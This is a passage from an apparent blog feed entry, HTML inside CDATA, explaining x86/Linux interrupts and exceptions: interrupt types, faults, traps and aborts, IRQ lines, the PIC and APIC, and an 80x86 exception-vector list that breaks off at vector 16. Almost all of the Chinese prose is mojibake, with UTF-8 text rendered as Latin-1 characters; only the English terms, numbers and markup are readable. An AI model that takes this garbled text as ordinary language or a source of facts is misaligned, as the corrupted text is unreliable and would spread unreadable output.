    <content type="html"><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>ä¸­æ–­é€šå¸¸è¢«å®šä¹‰ä¸ºä¸€ä¸ªäº‹ä»¶ï¼Œè¯¥äº‹ä»¶æ”¹å˜å¤„ç†å™¨æ‰§è¡Œçš„æŒ‡ä»¤é¡ºåºã€‚è¿™æ ·çš„äº‹ä»¶ä¸CPUèŠ¯ç‰‡å†…å¤–éƒ¨ç¡¬ä»¶ç”µè·¯äº§ç”Ÿçš„ç”µä¿¡å·ç›¸å¯¹åº”ã€‚</p><p>ä¸­æ–­é€šå¸¸åˆ†ä¸ºåŒæ­¥(synchronous)ä¸­æ–­å’Œå¼‚æ­¥(asynchronous)ä¸­æ–­ï¼š</p><ul><li>åŒæ­¥ä¸­æ–­æ˜¯å½“æŒ‡ä»¤æ‰§è¡Œæ—¶ç”±CPUæ§åˆ¶å•å…ƒäº§ç”Ÿçš„ï¼Œä¹‹æ‰€ä»¥ç§°ä¸ºåŒæ­¥ï¼Œæ˜¯å› ä¸ºåªæœ‰åœ¨ä¸€æ¡æŒ‡ä»¤ç»ˆæ­¢æ‰§è¡ŒåCPUæ‰ä¼šå‘å‡ºä¸­æ–­ã€‚</li><li>å¼‚æ­¥ä¸­æ–­æ˜¯ç”±å…¶ä»–ç¡¬ä»¶è®¾å¤‡ä¾ç…§CPUæ—¶é’Ÿä¿¡å·éšæœºäº§ç”Ÿçš„ã€‚</li></ul><p>åœ¨Intelå¾®å¤„ç†å™¨æ‰‹å†Œä¸­ï¼ŒæŠŠåŒæ­¥å’Œå¼‚æ­¥ä¸­æ–­åˆ†åˆ«ç§°ä¸ºå¼‚å¸¸(exception)å’Œä¸­æ–­(interrupt)</p><p>ä¸­æ–­æ˜¯ç”±<strong>é—´éš”å®šæ—¶å™¨</strong>å’Œ<strong>I/Oè®¾å¤‡</strong>äº§ç”Ÿçš„ï¼Œä¾‹å¦‚ï¼Œç”¨æˆ·çš„ä¸€æ¬¡æŒ‰é”®ä¼šå¼•èµ·ä¸€ä¸ªä¸­æ–­ã€‚</p><p>å¼‚å¸¸æ˜¯ç”±ç¨‹åºçš„é”™è¯¯äº§ç”Ÿçš„ï¼Œæˆ–è€…æ˜¯ç”±å†…æ ¸å¿…é¡»å¤„ç†çš„å¼‚å¸¸æ¡ä»¶äº§ç”Ÿçš„ã€‚ç¬¬ä¸€ç§æƒ…å†µä¸‹ï¼Œå†…æ ¸é€šè¿‡å‘é€ä¸€ä¸ªä¿¡å·æ¥å¤„ç†å¼‚å¸¸ï¼Œä¾‹å¦‚<code>SIGTERMã€SIGINT</code>ç­‰ã€‚ç¬¬äºŒç§æƒ…å†µä¸‹ï¼Œå†…æ ¸æ‰§è¡Œæ¢å¤å¼‚å¸¸éœ€è¦çš„æ‰€æœ‰æ­¥éª¤ï¼Œä¾‹å¦‚ç¼ºé¡µï¼Œæˆ–å¯¹å†…æ ¸æœåŠ¡çš„ä¸€ä¸ªè¯·æ±‚ã€‚</p><h4 id="ä¸­æ–­ä¿¡å·çš„ä½œç”¨"><a href="#ä¸­æ–­ä¿¡å·çš„ä½œç”¨" class="headerlink" title="ä¸­æ–­ä¿¡å·çš„ä½œç”¨"></a>ä¸­æ–­ä¿¡å·çš„ä½œç”¨</h4><p>ä¸­æ–­ä¿¡å·æä¾›äº†ä¸€ç§ç‰¹æ®Šçš„æ–¹å¼ï¼Œä½¿å¾—å¤„ç†å™¨è½¬è€Œå»è¿è¡Œæ­£å¸¸æ§åˆ¶æµä¹‹å¤–çš„ä»£ç ã€‚å½“ä¸€ä¸ªä¸­æ–­ä¿¡å·åˆ°è¾¾æ—¶ï¼ŒCPUå¿…é¡»åœæ­¢å®ƒå½“å‰æ‰€åšçš„äº‹æƒ…ï¼Œå¹¶ä¸”åˆ‡æ¢åˆ°ä¸€ä¸ªæ–°çš„æ´»åŠ¨ï¼Œä¸ºäº†åšåˆ°è¿™ä¸€ç‚¹ï¼Œå°±è¦åœ¨å†…æ ¸æ€å †æ ˆä¿å­˜ç¨‹åºè®¡æ•°å™¨çš„å½“å‰å€¼(å³eipå’Œcså¯„å­˜å™¨çš„å†…å®¹)ï¼Œå¹¶æŠŠä¸ä¸­æ–­ç±»å‹ç›¸å…³çš„ä¸€ä¸ªåœ°å€æ”¾è¿›ç¨‹åºè®¡æ•°å™¨ã€‚</p><p>å¿…é¡»è¦å£°æ˜çš„æ˜¯ï¼Œä¸­æ–­å¤„ç†ä¸è¿›ç¨‹åˆ‡æ¢æœ‰ä¸€ä¸ªæ˜æ˜¾çš„å·®å¼‚ï¼šç”±ä¸­æ–­æˆ–å¼‚å¸¸å¤„ç†ç¨‹åºæ‰§è¡Œçš„ä»£ç ä¸æ˜¯ä¸€ä¸ªè¿›ç¨‹ã€‚æ›´ç¡®åˆ‡åœ°è¯´ï¼Œå®ƒæ˜¯ä¸€ä¸ªå†…æ ¸æ§åˆ¶è·¯å¾„ï¼Œä»£è¡¨ä¸­æ–­å‘ç”Ÿæ—¶æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹æ‰§è¡Œï¼Œä½œä¸ºä¸€ä¸ªå†…æ ¸æ§åˆ¶è·¯å¾„ï¼Œä¸­æ–­å¤„ç†ç¨‹åºæ¯”ä¸€ä¸ªè¿›ç¨‹è¦â€œè½»â€ï¼ˆè¿™æ˜¯å› ä¸ºä¸­æ–­çš„ä¸Šä¸‹æ–‡å¾ˆå°‘ï¼Œå»ºç«‹æˆ–ç»ˆæ­¢ä¸­æ–­å¤„ç†éœ€è¦çš„äº‹ä»¶å¾ˆå°‘ï¼‰</p><p>ä¸­æ–­å¤„ç†æ˜¯ç”±å†…æ ¸æ‰§è¡Œçš„æœ€æ•æ„Ÿçš„ä»»åŠ¡ä¹‹ä¸€ï¼Œå®ƒå¿…é¡»æ»¡è¶³ä»¥ä¸‹çº¦æŸ</p><ul><li>å†…æ ¸çš„ç›®æ ‡å°±æ˜¯è®©ä¸­æ–­å°½å¯èƒ½å¿«çš„å¤„ç†å®Œï¼Œå°½å…¶æ‰€èƒ½æŠŠæ›´å¤šçš„å¤„ç†å‘åæ¨è¿Ÿï¼Œä¾‹å¦‚ï¼Œå‡è®¾ä¸€ä¸ªæ•°æ®å—å·²ç»åˆ°è¾¾äº†ç½‘çº¿ï¼Œå½“ç¡¬ä»¶ä¸­æ–­å†…æ ¸æ—¶ï¼Œå†…æ ¸åªç®€å•çš„æ ‡å¿—æ•°æ®åˆ°æ¥äº†ï¼Œè®©å¤„ç†å™¨æ¢å¤åˆ°å®ƒä»¥å‰è¿è¡Œçš„çŠ¶æ€ï¼Œå…¶ä½™çš„å¤„ç†ç¨åå†è¿›è¡Œï¼ˆå¦‚æŠŠæ•°æ®ç§»å…¥ä¸€ä¸ªç¼“å†²åŒºï¼Œå®ƒçš„æ¥æ”¶è¿›ç¨‹å¯ä»¥åœ¨ç¼“å†²åŒºæ‰¾åˆ°æ•°æ®å¹¶æ¢å¤è¿™ä¸ªè¿›ç¨‹çš„æ‰§è¡Œï¼‰ã€‚å› æ­¤ï¼Œå†…æ ¸å“åº”ä¸­æ–­åéœ€è¦è¿›è¡Œçš„æ“ä½œåˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼šå¯¹äºå…³é”®ç´§æ€¥çš„éƒ¨åˆ†ï¼Œå†…æ ¸ç«‹å³æ‰§è¡Œï¼›å…¶ä½™éƒ¨åˆ†å†…æ ¸éšåæ‰§è¡Œã€‚</li><li>å› ä¸ºä¸­æ–­éšæ—¶ä¼šåˆ°æ¥ï¼Œæ‰€ä»¥å†…æ ¸å¯èƒ½æ­£åœ¨å¤„ç†å…¶ä¸­ä¸€ä¸ªä¸­æ–­æ—¶ï¼Œå¦ä¸€ä¸ªä¸­æ–­åˆå‘ç”Ÿäº†ï¼Œåº”è¯¥å°½å¯èƒ½å¤šçš„å…è®¸è¿™ç§æƒ…å†µå‘ç”Ÿï¼Œå› ä¸ºè¿™èƒ½ç»´æŒæ›´å¤šçš„I/Oè®¾å¤‡å¤„äºå¿™çŠ¶æ€ã€‚å› æ­¤ï¼Œä¸­æ–­å¤„ç†ç¨‹åºå¿…é¡»ç¼–å†™æˆä½¿ç›¸åº”çš„å†…æ ¸æ§åˆ¶è·¯å¾„èƒ½ä»¥åµŒå¥—çš„æ–¹å¼æ‰§è¡Œã€‚å½“æœ€åä¸€ä¸ªå†…æ ¸æ§åˆ¶è·¯å¾„ç»ˆæ­¢æ—¶ï¼Œå†…æ ¸å¿…é¡»èƒ½æ¢å¤è¢«ä¸­æ–­è¿›ç¨‹çš„æ‰§è¡Œï¼Œæˆ–è€…ï¼Œå¦‚æœä¸­æ–­ä¿¡å·å·²å¯¼è‡´äº†é‡æ–°è°ƒåº¦ï¼Œå†…æ ¸èƒ½åˆ‡æ¢åˆ°å¦å¤–çš„è¿›ç¨‹ã€‚</li><li>å°½ç®¡å†…æ ¸åœ¨å¤„ç†å‰ä¸€ä¸ªä¸­æ–­æ—¶å¯ä»¥æ¥å—ä¸€ä¸ªæ–°çš„ä¸­æ–­ï¼Œä½†åœ¨å†…æ ¸ä»£ç ä¸­è¿˜æ˜¯å­˜åœ¨ä¸€äº›ä¸´ç•ŒåŒºï¼Œåœ¨ä¸´ç•ŒåŒºä¸­ï¼Œä¸­æ–­å¿…é¡»è¢«ç¦æ­¢ã€‚å¿…é¡»å°½å¯èƒ½åœ°é™åˆ¶è¿™æ ·çš„ä¸´ç•ŒåŒºï¼Œå› ä¸ºæ ¹æ®ä»¥å‰çš„è¦æ±‚ï¼Œå†…æ ¸å°¤å…¶æ˜¯ä¸­æ–­å¤„ç†ç¨‹åºï¼Œåº”è¯¥åœ¨å¤§éƒ¨åˆ†æ—¶é—´å†…ä»¥å¼€ä¸­æ–­çš„æ–¹å¼è¿è¡Œã€‚</li></ul><h4 id="ä¸­æ–­å’Œå¼‚å¸¸"><a href="#ä¸­æ–­å’Œå¼‚å¸¸" class="headerlink" title="ä¸­æ–­å’Œå¼‚å¸¸"></a>ä¸­æ–­å’Œå¼‚å¸¸</h4><h5 id="ä¸­æ–­"><a href="#ä¸­æ–­" class="headerlink" title="ä¸­æ–­"></a>ä¸­æ–­</h5><ul><li>å¯å±è”½ä¸­æ–­ï¼šI/Oè®¾å¤‡å‘å‡ºçš„æ‰€æœ‰ä¸­æ–­è¯·æ±‚éƒ½äº§ç”Ÿå¯å±è”½ä¸­æ–­ã€‚å¯å±è”½ä¸­æ–­å¯ä»¥å¤„äºä¸¤ç§çŠ¶æ€ï¼šå±è”½çš„(masked)æˆ–éå±è”½çš„(unmasked)ï¼Œä¸€ä¸ªå±è”½çš„ä¸­æ–­åªè¦è¿˜æ˜¯å±è”½çš„ï¼Œæ§åˆ¶å•å…ƒå°±å¿½ç•¥å®ƒã€‚</li><li>éå±è”½ä¸­æ–­ï¼šåªæœ‰å‡ ä¸ªå±æœºäº‹ä»¶(å¦‚ç¡¬ä»¶æ•…éšœ)æ‰å¼•èµ·éå±è”½ä¸­æ–­ï¼Œéå±è”½ä¸­æ–­æ€»æ˜¯ç”±CPUè¾¨è®¤</li></ul><h5 id="å¼‚å¸¸"><a href="#å¼‚å¸¸" class="headerlink" title="å¼‚å¸¸"></a>å¼‚å¸¸</h5><ul><li>å¤„ç†å™¨æ¢æµ‹å¼‚å¸¸ï¼šå½“CPUæ‰§è¡ŒæŒ‡ä»¤æ—¶æ¢æµ‹åˆ°çš„ä¸€ä¸ªåå¸¸æ¡ä»¶æ‰€äº§ç”Ÿçš„å¼‚å¸¸ã€‚å¯ä»¥è¿›ä¸€æ­¥åˆ†ä¸ºä¸‰ç»„ã€‚è¿™å–å†³äºCPUæ§åˆ¶å•å…ƒäº§ç”Ÿå¼‚å¸¸æ—¶ä¿å­˜åœ¨å†…æ ¸æ€å †æ ˆ<code>eip</code>å¯„å­˜å™¨ä¸­çš„å€¼<ul><li>æ•…éšœ(fault)ï¼šé€šå¸¸å¯ä»¥çº æ­£ï¼Œä¸€æ—¦çº æ­£ï¼Œç¨‹åºå°±å¯ä»¥åœ¨ä¸å¤±è¿è´¯æ€§çš„æƒ…å†µä¸‹é‡æ–°å¼€å§‹ã€‚ä¿å­˜åœ¨<code>eip</code>ä¸­çš„å€¼æ˜¯å¼•èµ·æ•…éšœçš„æŒ‡ä»¤åœ°å€ï¼Œå› æ­¤ï¼Œå½“å¼‚å¸¸å¤„ç†ç¨‹åºç»ˆæ­¢æ—¶ï¼Œé‚£æ¡æŒ‡ä»¤ä¼šè¢«é‡æ–°æ‰§è¡Œã€‚</li><li>é™·é˜±(trap)ï¼šåœ¨é™·é˜±æŒ‡ä»¤æ‰§è¡Œåç«‹å³æŠ¥å‘Šï¼Œå†…æ ¸æŠŠæ§åˆ¶æƒè¿”å›ç»™ç¨‹åºåå°±å¯ä»¥ç»§ç»­æ‰§è¡Œå®ƒçš„æ‰§è¡Œè€Œä¸å¤±è¿è´¯æ€§ï¼Œä¿å­˜åœ¨<code>eip</code>ä¸­çš„å€¼æ˜¯ä¸€ä¸ªéšåè¦æ‰§è¡Œçš„æŒ‡ä»¤åœ°å€ã€‚åªæœ‰å½“æ²¡æœ‰å¿…è¦é‡æ–°æ‰§è¡Œå·²ç»ˆæ­¢çš„æŒ‡ä»¤æ—¶ï¼Œæ‰è§¦å‘é™·é˜±ï¼Œ<strong>é™·é˜±çš„ä¸»è¦ç”¨é€”æ˜¯ä¸ºäº†è°ƒè¯•ç¨‹åº</strong>ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸­æ–­ä¿¡å·çš„ä½œç”¨æ˜¯é€šçŸ¥è°ƒè¯•ç¨‹åºä¸€æ¡ç‰¹æ®ŠæŒ‡ä»¤å·²è¢«æ‰§è¡Œ(ä¾‹å¦‚åˆ°äº†ä¸€ä¸ªç¨‹åºçš„æ–­ç‚¹)ã€‚ä¸€æ—¦ç”¨æˆ·æ£€æŸ¥åˆ°è°ƒè¯•ç¨‹åºæ‰€æä¾›çš„æ•°æ®ï¼Œä»–å°±å¯èƒ½è¦æ±‚è¢«è°ƒè¯•ç¨‹åºä»ä¸‹ä¸€æ¡æŒ‡ä»¤é‡æ–°å¼€å§‹æ‰§è¡Œã€‚</li><li>å¼‚å¸¸ä¸­æ­¢(abort)ï¼šå‘ç”Ÿä¸€ä¸ªä¸¥é‡çš„é”™è¯¯ï¼Œæ§åˆ¶å•å…ƒå‡ºäº†é—®é¢˜ï¼Œä¸èƒ½åœ¨<code>eip</code>å¯„å­˜å™¨ä¸­ä¿å­˜å¼•èµ·å¼‚å¸¸çš„æŒ‡ä»¤æ‰€åœ¨çš„ç¡®åˆ‡ä½ç½®ã€‚å¼‚å¸¸ä¸­æ­¢ç”¨äºæŠ¥å‘Šä¸¥é‡çš„é”™è¯¯ï¼Œå¦‚ç¡¬ä»¶æ•…éšœæˆ–ç³»ç»Ÿè¡¨ä¸­æ— æ•ˆçš„å€¼æˆ–ä¸ä¸€è‡´çš„å€¼ã€‚ç”±æ§åˆ¶å•å…ƒå‘ç”Ÿçš„è¿™ä¸ªä¸­æ–­ä¿¡å·æ˜¯ç´§æ€¥ä¿¡å·ï¼Œç”¨æ¥æŠŠæ§åˆ¶æƒåˆ‡æ¢åˆ°ç›¸åº”çš„å¼‚å¸¸ä¸­æ­¢å¤„ç†ç¨‹åºï¼Œè¿™ä¸ªå¼‚å¸¸ä¸­æ­¢å¤„ç†ç¨‹åºé™¤äº†å¼ºåˆ¶å—å½±å“çš„è¿›ç¨‹ç»ˆæ­¢å¤–ï¼Œæ²¡æœ‰åˆ«çš„é€‰æ‹©ã€‚</li></ul></li><li>ç¼–ç¨‹å¼‚å¸¸ï¼šåœ¨ç¼–ç¨‹è€…å‘å‡ºè¯·æ±‚æ—¶å‘ç”Ÿã€‚æ˜¯ç”±<code>int</code>æˆ–<code>int3</code>æŒ‡ä»¤è§¦å‘çš„ï¼Œå½“<code>into</code>(æ£€æŸ¥æº¢å‡º)å’Œ<code>bound</code>(æ£€æŸ¥è¶Šç•Œ)æŒ‡ä»¤æ£€æŸ¥çš„æ¡ä»¶ä¸ä¸ºçœŸæ—¶ï¼Œä¹Ÿå¼•èµ·ç¼–ç¨‹å¼‚å¸¸ã€‚æ§åˆ¶å•å…ƒæŠŠç¼–ç¨‹å¼‚å¸¸ä½œä¸ºé™·é˜±æ¥å¤„ç†ï¼Œç¼–ç¨‹å¼‚å¸¸é€šå¸¸ä¹Ÿå«åš<strong>è½¯ä¸­æ–­</strong>ã€‚è¿™æ ·çš„å¼‚å¸¸æœ‰ä¸¤ç§å¸¸ç”¨çš„ç”¨é€”ï¼šæ‰§è¡Œç³»ç»Ÿè°ƒç”¨åŠç»™è°ƒè¯•ç¨‹åºé€šæŠ¥ä¸€ä¸ªç‰¹å®šçš„äº‹ä»¶ã€‚</li></ul><p>æ¯ä¸ªä¸­æ–­å’Œå¼‚å¸¸æ˜¯ç”±0~255ä¹‹é—´çš„ä¸€ä¸ªæ•°æ¥æ ‡è¯†ï¼Œå› ä¸ºä¸€äº›æœªçŸ¥çš„åŸå› ï¼ŒIntelæŠŠè¿™ä¸ª8ä½çš„æ— ç¬¦å·æ•´æ•°å«åšä¸€ä¸ªå‘é‡(vector)ã€‚éå±è”½ä¸­æ–­çš„å‘é‡å’Œå¼‚å¸¸çš„å‘é‡æ˜¯å›ºå®šçš„ã€‚è€Œå¯å±è”½ä¸­æ–­çš„å‘é‡å¯ä»¥é€šè¿‡å¯¹ä¸­æ–­æ§åˆ¶å™¨çš„ç¼–ç¨‹æ¥æ”¹å˜ã€‚</p><h4 id="IRQå’Œä¸­æ–­"><a href="#IRQå’Œä¸­æ–­" class="headerlink" title="IRQå’Œä¸­æ–­"></a>IRQå’Œä¸­æ–­</h4><p>æ¯ä¸ªèƒ½å¤Ÿå‘å‡ºä¸­æ–­è¯·æ±‚çš„ç¡¬ä»¶è®¾å¤‡æ§åˆ¶å™¨éƒ½æœ‰ä¸€æ¡åä¸ºIRQ(Interrupt ReQuest)çš„è¾“å‡ºçº¿ï¼Œæ‰€æœ‰ç°æœ‰çš„IRQçº¿éƒ½ä¸ä¸€ä¸ªåä¸ºå¯ç¼–ç¨‹ä¸­æ–­æ§åˆ¶å™¨(Programmable Interrupt Controller,PIC)çš„ç¡¬ä»¶ç”µè·¯çš„è¾“å…¥å¼•è„šç›¸è¿ï¼Œå¯ç¼–ç¨‹ä¸­æ–­æ§åˆ¶å™¨æ‰§è¡Œä¸‹åˆ—åŠ¨ä½œ</p><ul><li>ç›‘è§†IRQçº¿ï¼Œæ£€æŸ¥äº§ç”Ÿçš„ä¿¡å·(raised signal)ã€‚å¦‚æœæœ‰æ¡æˆ–ä¸¤æ¡ä»¥ä¸Šçš„IRQçº¿ä¸Šäº§ç”Ÿä¿¡å·ï¼Œå°±é€‰æ‹©å¼•è„šç¼–å·è¾ƒå°çš„IRQçº¿ï¼Œ</li><li>å¦‚æœä¸€ä¸ªå¼•å‘ä¿¡å·å‡ºç°åœ¨IRQçº¿ä¸Š<ul><li>æŠŠæ¥æ”¶åˆ°çš„å¼•å‘ä¿¡å·è½¬æ¢æˆå¯¹åº”çš„å‘é‡</li><li>æŠŠè¿™ä¸ªå‘é‡å­˜æ”¾åœ¨ä¸­æ–­æ§åˆ¶å™¨çš„ä¸€ä¸ªI/Oç«¯å£ï¼Œä»è€Œå…è®¸CPUé€šè¿‡æ•°æ®æ€»çº¿è¯»æ­¤å‘é‡</li><li>æŠŠå¼•å‘ä¿¡å·å‘é€åˆ°å¤„ç†å™¨çš„INTRå¼•è„šï¼Œå³äº§ç”Ÿä¸€ä¸ªä¸­æ–­</li><li>ç­‰å¾…ï¼Œç›´åˆ°CPUé€šè¿‡æŠŠè¿™ä¸ªä¸­æ–­ä¿¡å·å†™è¿›å¯ç¼–ç¨‹ä¸­æ–­æ§åˆ¶å™¨çš„ä¸€ä¸ªI/Oç«¯å£æ¥ç¡®è®¤å®ƒï¼Œå½“è¿™ç§æƒ…å†µå‘ç”Ÿæ—¶ï¼Œæ¸…INTRçº¿ã€‚</li></ul></li><li>è¿”å›åˆ°ç›‘è§†IRQçº¿æ“ä½œ</li></ul><p>IRQçº¿æ˜¯ä»0å¼€å§‹é¡ºåºç¼–å·çš„ï¼Œå› æ­¤ï¼Œç¬¬ä¸€æ¡IRQçº¿é€šå¸¸è¡¨ç¤ºä¸ºIRQ0ï¼Œä¸IRQnå…³è”çš„Intelçš„ç¼ºçœå‘é‡æ˜¯n+32ã€‚å¦‚å‰æ‰€è¿°ï¼Œé€šè¿‡å‘ä¸­æ–­æ§åˆ¶å™¨ç«¯å£å‘å¸ƒåˆé€‚çš„æŒ‡ä»¤ï¼Œå°±å¯ä»¥ä¿®æ”¹IRQå’Œå‘é‡ä¹‹é—´çš„æ˜ å°„ã€‚</p><p>å¯ä»¥æœ‰é€‰æ‹©åœ°ç¦æ­¢æ¯æ¡IRQçº¿ã€‚å› æ­¤ï¼Œå¯ä»¥å¯¹PICç¼–ç¨‹ä»è€Œç¦æ­¢IRQï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¯ä»¥å‘Šè¯‰PICåœæ­¢å¯¹ç»™å®šçš„IRQçº¿å‘å¸ƒä¸­æ–­ï¼Œæˆ–è€…æ¿€æ´»å®ƒä»¬ã€‚ç¦æ­¢çš„ä¸­æ–­æ˜¯ä¸¢å¤±ä¸äº†çš„ï¼Œå®ƒä»¬ä¸€æ—¦è¢«æ¿€æ´»ï¼ŒPICå°±åˆæŠŠå®ƒä»¬å‘é€åˆ°CPUã€‚è¿™ä¸ªç‰¹ç‚¹è¢«å¤§å¤šæ•°ä¸­æ–­å¤„ç†ç¨‹åºä½¿ç”¨ï¼Œå› ä¸ºè¿™å…è®¸ä¸­æ–­å¤„ç†ç¨‹åºé€æ¬¡åœ°å¤„ç†åŒä¸€ç±»å‹çš„IRQã€‚</p><h4 id="é«˜çº§å¯ç¼–ç¨‹ä¸­æ–­æ§åˆ¶å™¨"><a href="#é«˜çº§å¯ç¼–ç¨‹ä¸­æ–­æ§åˆ¶å™¨" class="headerlink" title="é«˜çº§å¯ç¼–ç¨‹ä¸­æ–­æ§åˆ¶å™¨"></a>é«˜çº§å¯ç¼–ç¨‹ä¸­æ–­æ§åˆ¶å™¨</h4><p>å¦‚æœç³»ç»Ÿåªæœ‰ä¸€ä¸ªå•ç‹¬çš„CPUï¼Œé‚£ä¹ˆä¸»PICçš„è¾“å‡ºçº¿å¯ä»¥ç›´æˆªäº†å½“çš„è¿æ¥åˆ°CPUçš„INTRå¼•è„šã€‚ç„¶è€Œï¼Œå¦‚æœç³»ç»Ÿä¸­åŒ…å«ä¸¤ä¸ªæˆ–å¤šä¸ªCPUï¼Œé‚£ä¹ˆè¿™ç§æ–¹å¼ä¸å†æœ‰æ•ˆï¼Œå› è€Œéœ€è¦æ›´å¤æ‚çš„PICã€‚</p><p>Intelä»<code>Pentiun III</code>å¼€å§‹å¼•å…¥äº†ä¸€ç§åä¸ºI/Oé«˜çº§å¯ç¼–ç¨‹æ§åˆ¶å™¨(APIC)çš„æ–°ç»„ä»¶ã€‚æ­¤å¤–ï¼Œ<code>80x86</code>å¾®å¤„ç†å™¨å½“å‰æ‰€æœ‰çš„CPUéƒ½å«æœ‰ä¸€ä¸ªæœ¬åœ°<code>APIC</code>ã€‚æ¯ä¸ªæœ¬åœ°<code>APIC</code>éƒ½æœ‰32ä½çš„å¯„å­˜å™¨ã€ä¸€ä¸ªå†…éƒ¨æ—¶é’Ÿã€ä¸€ä¸ªæœ¬åœ°å®šæ—¶è®¾å¤‡åŠä¸ºæœ¬åœ°<code>APIC</code>ä¸­æ–­ä¿ç•™çš„ä¸¤æ¡é¢å¤–çš„IRQçº¿<code>LINR0</code>å’Œ<code>LINT1</code>ã€‚æ‰€æœ‰æœ¬åœ°<code>APIC</code>éƒ½è¿æ¥åˆ°ä¸€ä¸ªå¤–éƒ¨<code>I/O APIC</code>ï¼Œå½¢æˆä¸€ä¸ªå¤š<code>APIC</code>çš„ç³»ç»Ÿã€‚</p><h4 id="å¼‚å¸¸-1"><a href="#å¼‚å¸¸-1" class="headerlink" title="å¼‚å¸¸"></a>å¼‚å¸¸</h4><p><code>80x86</code>å¾®å¤„ç†å™¨å‘å¸ƒäº†å¤§çº¦20ç§ä¸åŒçš„å¼‚å¸¸ã€‚å†…æ ¸å¿…é¡»ä¸ºæ¯ç§å¼‚å¸¸æä¾›ä¸€ä¸ªä¸“é—¨çš„å¼‚å¸¸å¤„ç†ç¨‹åºã€‚å¯¹äºæŸäº›å¼‚å¸¸ï¼ŒCPUæ§åˆ¶å•å…ƒåœ¨å¼€å§‹æ‰§è¡Œå¼‚å¸¸å¤„ç†ç¨‹åºå‰ä¼šäº§ç”Ÿä¸€ä¸ªç¡¬ä»¶å‡ºé”™ç ï¼Œå¹¶ä¸”å‹å…¥å†…æ ¸æ€å †æ ˆã€‚</p><p>åœ¨<code>80x86</code>å¤„ç†å™¨ä¸­å¯ä»¥æ‰¾åˆ°çš„å¼‚å¸¸çš„å‘é‡ã€åå­—ã€ç±»å‹åŠå…¶æè¿°å¦‚ä¸‹</p><ul><li>0 â€œDivide errorâ€ï¼ˆæ•…éšœï¼‰ï¼šå½“ä¸€ä¸ªç¨‹åºè¯•å›¾æ‰§è¡Œæ•´æ•°è¢«0é™¤æ“ä½œæ—¶äº§ç”Ÿ</li><li>1 â€œDebugâ€ï¼ˆé™·é˜±æˆ–æ•…éšœï¼‰ï¼šè®¾ç½®<code>eflags</code>çš„TFæ ‡å¿—æ—¶æˆ–ä¸€æ¡æŒ‡ä»¤æˆ–æ“ä½œæ•°çš„åœ°å€è½åœ¨ä¸€ä¸ªæ´»åŠ¨debugå¯„å­˜å™¨çš„èŒƒå›´ä¹‹å†…æ—¶</li><li>2 æœªç”¨ ï¼šä¸ºéå±è”½ä¸­æ–­ä¿ç•™ï¼ˆåˆ©ç”¨NMIå¼•è„šçš„é‚£äº›ä¸­æ–­ï¼‰</li><li>3 â€œBreakpointâ€ ï¼ˆé™·é˜±ï¼‰ï¼šç”±<code>int3</code>(æ–­ç‚¹)æŒ‡ä»¤å¼•èµ·</li><li>4 â€œOverflowâ€ï¼ˆé™·é˜±ï¼‰ï¼šå½“<code>eflags</code>çš„OFæ ‡å¿—è¢«è®¾ç½®æ—¶ï¼Œ<code>into</code>(æ£€æŸ¥æº¢å‡º)æŒ‡ä»¤è¢«æ‰§è¡Œ</li><li>5 â€œBounds checkâ€ï¼ˆæ•…éšœï¼‰ï¼šå¯¹äºæœ‰æ•ˆæŠµåˆ¶èŒƒå›´ä¹‹å¤–çš„æ“ä½œæ•°ï¼Œbound(æ£€æŸ¥åœ°å€è¾¹ç•Œ)æŒ‡ä»¤è¢«æ‰§è¡Œ</li><li>6 â€œInvalid opcodeâ€ï¼ˆæ•…éšœï¼‰ï¼šCPUæ‰§è¡Œå•å…ƒæ£€æµ‹åˆ°ä¸€ä¸ªæ— æ•ˆçš„æ“ä½œç </li><li>7 â€œDevice not availableâ€ï¼ˆæ•…éšœï¼‰ï¼šéšç€<code>cr0</code>çš„TSæ ‡å¿—è¢«è®¾ç½®ï¼ŒESCAPEã€MMXæˆ–XMMæŒ‡ä»¤è¢«æ‰§è¡Œ</li><li>8 â€œDouble faultâ€ï¼ˆå¼‚å¸¸ä¸­æ­¢ï¼‰ï¼šæ­£å¸¸æƒ…å†µä¸‹ï¼Œå½“CPUè¯•å›¾ä¸ºå‰ä¸€ä¸ªå¼‚å¸¸è°ƒç”¨å¤„ç†ç¨‹åºæ—¶ï¼ŒåŒæ—¶åˆæ£€æµ‹åˆ°ä¸€ä¸ªå¼‚å¸¸ï¼Œä¸¤ä¸ªå¼‚å¸¸èƒ½è¢«ä¸²è¡Œåœ°å¤„ç†ã€‚ç„¶è€Œï¼Œåœ¨å°‘æ•°æƒ…å†µä¸‹ï¼Œå¤„ç†å™¨ä¸èƒ½ä¸²è¡Œåœ°å¤„ç†å®ƒä»¬ï¼Œå› è€Œäº§ç”Ÿè¿™ç§å¼‚å¸¸ã€‚</li><li>9 â€œCoprocessor segment overrunâ€ï¼ˆå¼‚å¸¸ä¸­æ­¢ï¼‰ï¼šå› å¤–éƒ¨çš„æ•°å­¦æ–œå¤„ç†å™¨å¼•èµ·çš„é—®é¢˜</li><li>10 â€œInvalid TSSâ€ï¼ˆæ•…éšœï¼‰ï¼šCPUè¯•å›¾è®©ä¸€ä¸ªä¸Šä¸‹æ–‡åˆ‡æ¢åˆ°æœ‰æ— æ•ˆçš„TSSçš„è¿›ç¨‹</li><li>11 â€œSegment not presentâ€ï¼ˆæ•…éšœï¼‰ï¼šå¼•ç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„å†…å­˜æ®µ</li><li>12 â€œStack segment faultâ€ï¼ˆæ•…éšœï¼‰ï¼šè¯•å›¾è¶…è¿‡æ ˆæ®µç•Œé™çš„æŒ‡ä»¤ï¼Œæˆ–è€…ç”±ssæ ‡è¯†çš„æ®µä¸åœ¨å†…å­˜</li><li>13 â€œGeneral protectionâ€ï¼ˆæ•…éšœï¼‰ï¼šè¿åäº†<code>80x86</code>ä¿æŠ¤æ¨¡å¼ä¸‹çš„ä¿æŠ¤è§„åˆ™ä¹‹ä¸€</li><li>14 â€œPage faultâ€ï¼ˆæ•…éšœï¼‰ï¼šå¯»å€çš„é¡µä¸åœ¨å†…å­˜ï¼Œç›¸åº”çš„é¡µè¡¨é¡¹ä¸ºç©ºï¼Œæˆ–è€…è¿åäº†ä¸€ç§åˆ†é¡µä¿æŠ¤æœºåˆ¶</li><li>15 ç”±Intelä¿ç•™</li><li>16 